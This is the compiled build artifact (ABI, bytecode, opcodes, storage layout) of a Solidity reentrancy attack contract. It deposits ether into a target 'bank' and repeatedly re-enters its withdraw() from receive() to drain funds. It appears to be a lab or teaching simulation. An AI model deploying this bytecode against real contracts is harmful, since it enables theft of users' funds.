{"contracts/attacks/reentrancy.sol":{"reentrancy":{"abi":[{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"finalBalance","type":"uint256"}],"name":"AttackFinished","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AttackStarted","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"count","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"contractBalance","type":"uint256"}],"name":"Reentered","type":"event"},{"inputs":[],"name":"attackInProgress","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxReentries","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"reentryCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_max","type":"uint256"}],"name":"setMaxReentries","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"simulateAttack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"target","outputs":[{"internalType":"contract IBank","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"linkReferences":{},"object":"6080604052600a600255348015601457600080fd5b506040516104b83803806104b88339810160408190526031916055565b600080546001600160a01b0319166001600160a01b03929092169190911790556083565b600060208284031215606657600080fd5b81516001600160a01b0381168114607c57600080fd5b9392505050565b610426806100926000396000f3fe6080604052600436106100745760003560e01c8063818c8c7c1161004e578063818c8c7c146101a0578063ab50099d146101ca578063d2cacac2146101ea578063d4b83992146101f257600080fd5b806312065fe014610152578063352bb4ba1461017457806353b381691461018a57600080fd5b3661014d5760035460ff16801561008e5750600254600154105b1561014b57600180549060006100a3836103b0565b9091555050600154600054604080519283526001600160a01b039091163160208301527f0b8e59e64518371a96f6e471520e4353d76709453d198e87a22fef9f6e0a2d3f910160405180910390a16000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561013257600080fd5b505af1158015610146573d6000803e3d6000fd5b505050505b005b600080fd5b34801561015e57600080fd5b50475b6040519081526020015b60405180910390f35b34801561018057600080fd5b5061016160025481565b34801561019657600080fd5b5061016160015481565b3480156101ac57600080fd5b506003546101ba9060ff1681565b604051901515815260200161016b565b3480156101d657600080fd5b5061014b6101e53660046103d7565b600255565b61014b61022a565b3480156101fe57600080fd5b50600054610212906001600160a01b031681565b6040516001600160a01b03909116815260200161016b565b600034116102695760405162461bcd60e51b81526020600482015260086024820152670a6cadcc8408aa8960c31b604482015260640160405180910390fd5b6003805460ff191660011790556040517f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a906102a89034815260200190565b60405180910390a160008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102fe57600080fd5b505af1158015610312573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b15801561035957600080fd5b505af115801561036d573d6000803e3d6000fd5b50506003805460ff1916905550506040514781527f45776e8c4137c2d25b59c6bc4e32fd07c3789be92c2623f548bdcc1c513ffad69060200160405180910390a1565b6000600182016103d057634e487b7160e01b600052601160045260246000fd5b5060010190565b6000602082840312156103e957600080fd5b503591905056fea2646970667358221220a1a5b022d56c99f9785859a759b8ca3968197b229fc62dcc18ff7faabfb840c464736f6c634300081e0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0xA PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH1 0x14 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4B8 CODESIZE SUB DUP1 PUSH2 0x4B8 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH1 0x31 SWAP2 PUSH1 0x55 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE PUSH1 0x83 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH1 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH1 0x7C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x426 DUP1 PUSH2 0x92 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x74 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x818C8C7C GT PUSH2 0x4E JUMPI DUP1 PUSH4 0x818C8C7C EQ PUSH2 0x1A0 JUMPI DUP1 PUSH4 0xAB50099D EQ PUSH2 0x1CA JUMPI DUP1 PUSH4 0xD2CACAC2 EQ PUSH2 0x1EA JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x1F2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x152 JUMPI DUP1 PUSH4 0x352BB4BA EQ PUSH2 0x174 JUMPI DUP1 PUSH4 0x53B38169 EQ PUSH2 0x18A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x14D JUMPI PUSH1 0x3 SLOAD PUSH1 0xFF AND DUP1 ISZERO PUSH2 0x8E JUMPI POP PUSH1 0x2 SLOAD PUSH1 0x1 SLOAD LT JUMPDEST ISZERO PUSH2 0x14B JUMPI PUSH1 0x1 DUP1 SLOAD SWAP1 PUSH1 0x0 PUSH2 0xA3 DUP4 PUSH2 0x3B0 JUMP JUMPDEST SWAP1 SWAP2 SSTORE POP POP PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND BALANCE PUSH1 0x20 DUP4 ADD MSTORE PUSH32 0xB8E59E64518371A96F6E471520E4353D76709453D198E87A22FEF9F6E0A2D3F SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP3 PUSH4 0x3CCFD60B SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x132 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x146 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x15E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SELFBALANCE JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x180 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x161 PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x196 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x161 PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x3 SLOAD PUSH2 0x1BA SWAP1 PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x16B JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x14B PUSH2 0x1E5 CALLDATASIZE PUSH1 0x4 PUSH2 0x3D7 JUMP JUMPDEST PUSH1 0x2 SSTORE JUMP JUMPDEST PUSH2 0x14B PUSH2 0x22A JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH2 0x212 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x16B JUMP JUMPDEST PUSH1 0x0 CALLVALUE GT PUSH2 0x269 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x8 PUSH1 0x24 DUP3 ADD MSTORE PUSH8 0xA6CADCC8408AA89 PUSH1 0xC3 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x1 OR SWAP1 SSTORE PUSH1 0x40 MLOAD PUSH32 0x33F040BCC293552B556FB3082B0E9FB26495AEAE16EF365BD761C702978EEC0A SWAP1 PUSH2 0x2A8 SWAP1 CALLVALUE DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x312 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x3CCFD60B PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP6 POP PUSH4 0x3CCFD60B SWAP5 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP5 POP SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x359 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x36D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SSTORE POP POP PUSH1 0x40 MLOAD SELFBALANCE DUP2 MSTORE PUSH32 0x45776E8C4137C2D25B59C6BC4E32FD07C3789BE92C2623F548BDCC1C513FFAD6 SWAP1 PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x3D0 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x3E9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xA5 0xB0 0x22 0xD5 PUSH13 0x99F9785859A759B8CA3968197B 0x22 SWAP16 0xC6 0x2D 0xCC XOR SELFDESTRUCT PUSH32 0xAABFB840C464736F6C634300081E003300000000000000000000000000000000 "},"gasEstimates":{"creation":{"codeDepositCost":"212400","executionCost":"infinite","totalCost":"infinite"},"external":{"attackInProgress()":"2310","getBalance()":"173","maxReentries()":"2307","reentryCount()":"2329","setMaxReentries(uint256)":"22334","simulateAttack()":"infinite","target()":"2403"}},"methodIdentifiers":{"attackInProgress()":"818c8c7c","getBalance()":"12065fe0","maxReentries()":"352bb4ba","reentryCount()":"53b38169","setMaxReentries(uint256)":"ab50099d","simulateAttack()":"d2cacac2","target()":"d4b83992"}},"storageLayout":{"storage":[{"astId":11,"contract":"contracts/attacks/reentrancy.sol:reentrancy","label":"target","offset":0,"slot":"0","type":"t_contract(IBank)8"},{"astId":13,"contract":"contracts/attacks/reentrancy.sol:reentrancy","label":"reentryCount","offset":0,"slot":"1","type":"t_uint256"},{"astId":16,"contract":"contracts/attacks/reentrancy.sol:reentrancy","label":"maxReentries","offset":0,"slot":"2","type":"t_uint256"},{"astId":18,"contract":"contracts/attacks/reentrancy.sol:reentrancy","label":"attackInProgress","offset":0,"slot":"3","type":"t_bool"}],"types":{"t_bool":{"encoding":"inplace","label":"bool","numberOfBytes":"1"},"t_contract(IBank)8":{"encoding":"inplace","label":"contract IBank","numberOfBytes":"20"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}}}